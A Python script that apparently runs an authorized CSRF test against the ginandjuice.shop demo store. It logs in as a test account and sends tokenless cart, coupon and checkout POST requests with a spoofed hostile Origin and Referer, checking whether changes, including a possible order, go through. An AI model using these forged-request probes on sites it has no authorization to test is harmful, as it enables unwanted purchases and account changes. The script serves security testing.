#!/usr/bin/env python3
"""Manual CSRF truth-check on ginandjuice.shop (authorized scanme, test account carlos).
Q1: tokenless POST /catalog/cart accepted from hostile Origin/Referer? (state verified via cart)
Q2: is the coupon form's csrf token actually enforced?
Q3: is the checkout form's csrf token actually enforced? (observed without placing an order:
    send a bogus/no-op variant and compare rejection signals — checkout with EMPTY-ish body)
"""
import re, urllib.parse, http.client, ssl, json
from http.cookies import SimpleCookie

ctx = ssl.create_default_context()
HOST = 'ginandjuice.shop'

class Sess:
    def __init__(self):
        self.jar = {}
        self.c = http.client.HTTPSConnection(HOST, timeout=15, context=ctx)
    def req(self, method, path, body=None, extra=None):
        h = {'User-Agent': 'SENTINEL-csrf-proof/3.0', 'Accept': 'text/html'}
        if self.jar: h['Cookie'] = '; '.join(f'{k}={v}' for k, v in self.jar.items())
        if body is not None: h['Content-Type'] = 'application/x-www-form-urlencoded'
        if extra: h.update(extra)
        self.c.request(method, path, body=body, headers=h)
        r = self.c.getresponse(); data = r.read().decode('utf-8', 'replace')
        for s in [v for k, v in r.getheaders() if k.lower() == 'set-cookie']:
            ck = SimpleCookie(); ck.load(s)
            for k, v in ck.items(): self.jar[k] = v.value
        return r.status, dict(r.getheaders()), data
    def login(self):
        st, h, b = self.req('GET', '/login')
        csrf = re.search(r'name="csrf" value="([^"]+)"', b).group(1)
        st, h, b = self.req('POST', '/login',
            urllib.parse.urlencode({'csrf': csrf, 'username': 'carlos', 'password': 'hunter2'}).encode())
        return st == 302 and '/my-account' in h.get('Location', '')
    def cart_products(self):
        st, h, b = self.req('GET', '/catalog/cart')
        return sorted(set(re.findall(r'productId=(\d+)', b))), b

# Q1 — hostile-origin add-to-cart on a FRESH session (victim semantics)
s = Sess()
print('login:', s.login())
before, _ = s.cart_products()
print('cart before:', before)
HOSTILE = {'Origin': 'https://csrf-probe.example', 'Referer': 'https://csrf-probe.example/x.html'}
st, h, b = s.req('POST', '/catalog/cart',
                 urllib.parse.urlencode({'productId': '3', 'redir': 'PRODUCT', 'quantity': '1'}).encode(),
                 extra=HOSTILE)
print('Q1 hostile-origin add-to-cart ->', st, '| Location:', h.get('Location', ''))
after, cartb = s.cart_products()
print('Q1 cart after:', after, '| product 3 added:', '3' in after and '3' not in before)

# Q2 — coupon form csrf enforcement: POST WITHOUT the csrf field
s2 = Sess(); s2.login()
st, h, b = s2.req('POST', '/catalog/cart/coupon',
                  urllib.parse.urlencode({'coupon': 'SENTINEL'}).encode(), extra=HOSTILE)
body_snip = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', b)).strip()[:200]
print('Q2 coupon WITHOUT csrf, hostile origin ->', st, '| body:', body_snip[:160])
# control: with a proper csrf (fetch cart page for fresh token)
st, h, cart = s2.req('GET', '/catalog/cart')
m = re.search(r'name="csrf" value="([^"]+)"', cart)
if m:
    st, h, b = s2.req('POST', '/catalog/cart/coupon',
                      urllib.parse.urlencode({'csrf': m.group(1), 'coupon': 'SENTINEL'}).encode())
    body_snip2 = re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', b)).strip()[:200]
    print('Q2 control WITH csrf ->', st, '| body:', body_snip2[:160])

# Q3 — checkout csrf enforcement: POST /catalog/cart/checkout WITHOUT csrf (cart has 1 item;
# if the token is decorative this PLACES an order on the demo account — authorized scanme,
# test account, canary order acceptable and documented)
s3 = Sess(); s3.login()
st, h, b = s3.req('POST', '/catalog/cart', urllib.parse.urlencode({'productId': '2', 'redir': 'PRODUCT', 'quantity': '1'}).encode())
print('Q3 setup add productId=2 ->', st)
st, h, b = s3.req('POST', '/catalog/cart/checkout', b'', extra=HOSTILE)
loc = h.get('Location', '')
print('Q3 checkout WITHOUT csrf, hostile origin ->', st, '| Location:', loc)
if st == 302 and loc:
    st2, h2, b2 = s3.req('GET', loc)
    t = re.search(r'<title>(.*?)</title>', b2)
    print('Q3 landing:', st2, '|', (t.group(1) if t else '')[:60])
    order_ids = re.findall(r'orderId=(\d+)', b2)
    print('Q3 order ids visible on landing:', order_ids[:3])
    ok = 'order' in (t.group(1).lower() if t else '')
    print('Q3 ORDER PLACED WITHOUT CSRF:', ok or bool(order_ids))
